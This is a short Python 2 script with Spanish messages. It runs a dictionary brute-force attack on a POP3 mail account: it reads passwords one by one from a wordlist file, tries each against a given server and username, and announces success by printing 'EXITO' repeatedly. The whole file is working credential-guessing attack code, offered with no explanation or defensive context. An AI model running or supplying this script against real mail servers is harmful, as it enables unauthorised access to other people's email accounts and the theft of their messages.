import getpass, poplib
from time import sleep
import sys

if len(sys.argv) < 4:
    exit("faltan parametros")
    
f = open(sys.argv[3],"r")
for linea in f:
    passwd = linea[0:-1]
    print passwd;
    try:
        M = poplib.POP3(sys.argv[2])
        M.user(sys.argv[1])
        M.pass_(passwd)
        M.close()
        print "EXITO" * 50
        exit()
    except BaseException as e:
        print e
    sleep(1)